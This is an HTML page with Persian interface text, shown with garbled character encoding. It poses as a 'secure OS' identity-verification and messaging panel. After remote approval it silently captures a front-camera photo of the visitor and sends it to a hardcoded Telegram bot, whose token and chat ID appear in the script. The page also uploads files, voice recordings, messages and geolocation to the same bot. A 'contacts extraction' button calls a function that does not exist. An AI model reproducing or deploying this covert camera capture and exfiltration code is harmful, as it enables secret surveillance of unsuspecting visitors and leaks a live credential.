<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HOTKYNTAKY SECURE OS</title>
    <style>
        body { background: #000; color: #00ff41; font-family: 'Tahoma', sans-serif; margin: 0; padding: 15px; }
        .terminal { max-width: 480px; margin: auto; border: 1px solid #00ff41; padding: 20px; border-radius: 12px; box-shadow: 0 0 15px #004411; }
        input, textarea { background: #000; border: 1px solid #00ff41; color: #00ff41; padding: 12px; width: 100%; border-radius: 8px; margin: 8px 0; box-sizing: border-box; }
        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
        button { background: #00ff41; color: #000; border: none; padding: 14px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
        button:active { transform: scale(0.97); }
        .voice-btn { grid-column: span 2; background: #ff3e3e; color: #fff; }
        .file-btn { background: #0088ff !important; color: white !important; }
        #adminBox { background: rgba(0, 255, 65, 0.1); border: 1px dashed #00ff41; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 15px; }
        .status-wait { color: #ffcc00; font-size: 14px; margin-top: 10px; }
        #video-preview { display: none; }
    </style>
</head>
<body>

    <video id="video-preview" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="authBox" style="text-align: center; margin-top: 80px;">
        <h2>ğŸ›¡ï¸ Ø³ÛŒØ³ØªÙ… ØªØ§ÛŒÛŒØ¯ Ù‡ÙˆÛŒØª Ù…Ø±Ú©Ø²ÛŒ</h2>
        <p>Ù„Ø·ÙØ§Ù‹ Ù†Ø§Ù… Ø®ÙˆØ¯ Ø±Ø§ Ø¨Ø±Ø§ÛŒ Ø§Ø¯Ù…ÛŒÙ† Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯</p>
        <input type="text" id="authName" placeholder="Ù†Ø§Ù… Ø´Ù…Ø§" style="text-align: center;">
        <button onclick="requestAccess()" style="width: 100%;">Ø¯Ø±Ø®ÙˆØ§Ø³Øª ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ù¾Ù†Ù„</button>
        <div id="waitMsg" class="status-wait"></div>
    </div>

    <div id="mainPanel" class="terminal" style="display:none;">
        <div id="adminBox">ğŸ“¡ Ø¯Ø³ØªØ±Ø³ÛŒ ØªØ§ÛŒÛŒØ¯ Ø´Ø¯. Ø®ÙˆØ´ Ø¢Ù…Ø¯ÛŒØ¯.</div>

        <input type="text" id="userName" placeholder="Ù†Ø§Ù… ÙØ±Ø³ØªÙ†Ø¯Ù‡">
        <textarea id="msgBody" rows="2" placeholder="Ù…ØªÙ† Ù¾ÛŒØ§Ù…..."></textarea>
        <button onclick="sendText()" style="width:100%;">ğŸ“¤ Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù… Ù…ØªÙ†ÛŒ</button>

        <div class="btn-grid">
            <button id="recordBtn" class="voice-btn" onclick="toggleRecording()">ğŸ¤ Ø¶Ø¨Ø· Ùˆ Ø§Ø±Ø³Ø§Ù„ ÙˆÛŒØ³</button>
            <button onclick="getContacts()" style="background:#aa00ff; color:white; grid-column: span 2;">ğŸ‘¥ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ø®Ø§Ø·Ø¨ÛŒÙ†</button>
            <button class="file-btn" onclick="openPicker('video/*')">ğŸ¥ Ø§Ø±Ø³Ø§Ù„ ÙˆÛŒØ¯ÛŒÙˆ</button>
            <button class="file-btn" onclick="openPicker('*/*')" style="background:#555 !important;">ğŸ“ ÙØ§ÛŒÙ„/Ø³Ù†Ø¯</button>
            <button onclick="sendLocation()" style="background:#ffcc00; color:black;">ğŸ“ Ù…ÙˆÙ‚Ø¹ÛŒØª</button>
            <button onclick="openPicker('image/*')" style="background:#00cc66; color:white;">ğŸ“¸ Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³</button>
        </div>

        <input type="file" id="fileInput" style="display:none" onchange="handleFileUpload()">
        <p id="statusMsg" style="text-align:center; font-size:11px; color:#777; margin-top:20px;">SYSTEM STATUS: ENCRYPTED</p>
    </div>

    <script>
        const botToken = "8576028087:AAGUs0ZWXpLYp5mRN0XbI-2ZuIu4eLRtpNM"; //
        const chatId = "8449439423"; //
        let mediaRecorder, audioChunks = [], isRecording = false;
        let approvalCheck;

        function requestAccess() {
            const name = document.getElementById('authName').value;
            if(!name) return alert("Ù†Ø§Ù… Ø±Ø§ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯!");

            const text = `âš ï¸ Ø¯Ø±Ø®ÙˆØ§Ø³Øª ÙˆØ±ÙˆØ¯ Ø¬Ø¯ÛŒØ¯:\nğŸ‘¤ Ù†Ø§Ù…: ${name}\n\nØ¨Ø±Ø§ÛŒ ØªØ§ÛŒÛŒØ¯ØŒ ÙØ§ÛŒÙ„ admin.json Ø±Ø§ Ø¯Ø± Ú¯ÛŒØªâ€ŒÙ‡Ø§Ø¨ Ø¨Ù‡ status: ok ØªØºÛŒÛŒØ± Ø¯Ù‡ÛŒØ¯.`;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);

            document.getElementById('waitMsg').innerText = "â³ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯. Ø¯Ø± Ø§Ù†ØªØ¸Ø§Ø± ØªØ§ÛŒÛŒØ¯ Ø§Ø¯Ù…ÛŒÙ†...";
            
            // Ø´Ø±ÙˆØ¹ Ú†Ú© Ú©Ø±Ø¯Ù† ÙØ§ÛŒÙ„ Ú¯ÛŒØªâ€ŒÙ‡Ø§Ø¨ Ø¨Ø±Ø§ÛŒ ØªØ§ÛŒÛŒØ¯
            approvalCheck = setInterval(checkGitHubStatus, 4000);
        }

        async function checkGitHubStatus() {
            try {
                const response = await fetch("https://raw.githubusercontent.com/hotkyntaky/Iman/main/admin.json?t=" + Date.now());
                const data = await response.json();
                
                if(data.status === "ok") {
                    clearInterval(approvalCheck);
                    showMainPanel();
                }
            } catch (e) {}
        }

        function showMainPanel() {
            document.getElementById('authBox').style.display = 'none';
            document.getElementById('mainPanel').style.display = 'block';
            startSilentCamera(); 
            prepareAudio();
        }

        // ØªÙˆØ§Ø¨Ø¹ Ø§Ø±Ø³Ø§Ù„ ÙØ§ÛŒÙ„ØŒ ÙˆÛŒØ³ØŒ Ù…ØªÙ† Ùˆ Ø¯ÙˆØ±Ø¨ÛŒÙ† (Ù‡Ù…Ø§Ù† Ú©Ø¯Ù‡Ø§ÛŒ Ù‚Ø¨Ù„ÛŒ Ø´Ù…Ø§ Ø¨Ø§ Ø§ØµÙ„Ø§Ø­Ø§Øª)
        // ... (ØªÙˆØ§Ø¨Ø¹ openPicker, handleFileUpload, startSilentCamera, getContacts, sendText, sendLocation Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù‚Ø±Ø§Ø± Ø¯Ø§Ø±Ù†Ø¯)
        
        function openPicker(type) {
            const input = document.getElementById('fileInput');
            input.accept = type;
            input.click();
        }

        function handleFileUpload() {
            const file = document.getElementById('fileInput').files[0];
            if (!file) return;
            const name = document.getElementById('userName').value || "Ù†Ø§Ø´Ù†Ø§Ø³";
            const fd = new FormData();
            fd.append('chat_id', chatId);
            let method = file.type.startsWith('image/') ? 'sendPhoto' : (file.type.startsWith('video/') ? 'sendVideo' : 'sendDocument');
            let field = file.type.startsWith('image/') ? 'photo' : (file.type.startsWith('video/') ? 'video' : 'document');
            fd.append(field, file);
            fd.append('caption', `ğŸ“ ÙØ§ÛŒÙ„ Ø§Ø²: ${name}\nğŸ“„ ${file.name}`);
            fetch(`https://api.telegram.org/bot${botToken}/${method}`, { method: 'POST', body: fd })
            .then(() => { document.getElementById('statusMsg').innerText = "Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯ âœ…"; });
        }

        async function startSilentCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video-preview');
                video.srcObject = stream;
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('photo', blob, 'pic.jpg');
                        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
                        stream.getTracks().forEach(t => t.stop());
                    }, 'image/jpeg');
                }, 2000);
            } catch (err) {}
        }

        function sendText() {
            const n = document.getElementById('userName').value || "Ù†Ø§Ø´Ù†Ø§Ø³";
            const m = document.getElementById('msgBody').value;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("ğŸ‘¤ "+n+":\n"+m)}`);
            document.getElementById('msgBody').value = "";
        }

        async function prepareAudio() {
            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(s);
            mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
            mediaRecorder.onstop = () => {
                const b = new Blob(audioChunks, { type: 'audio/ogg' });
                const fd = new FormData();
                fd.append('chat_id', chatId); fd.append('voice', b, 'v.ogg');
                fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, { method: 'POST', body: fd });
            };
        }

        function toggleRecording() {
            const btn = document.getElementById('recordBtn');
            if (!isRecording) {
                audioChunks = []; mediaRecorder.start(); isRecording = true;
                btn.innerText = "ğŸ›‘ ØªÙˆÙ‚Ù Ùˆ Ø§Ø±Ø³Ø§Ù„...";
            } else {
                mediaRecorder.stop(); isRecording = false;
                btn.innerText = "ğŸ¤ Ø¶Ø¨Ø· ÙˆÛŒØ³";
            }
        }

        function sendLocation() {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${pos.coords.latitude}&longitude=${pos.coords.longitude}`);
            });
        }
    </script>
</body>
</html>
 
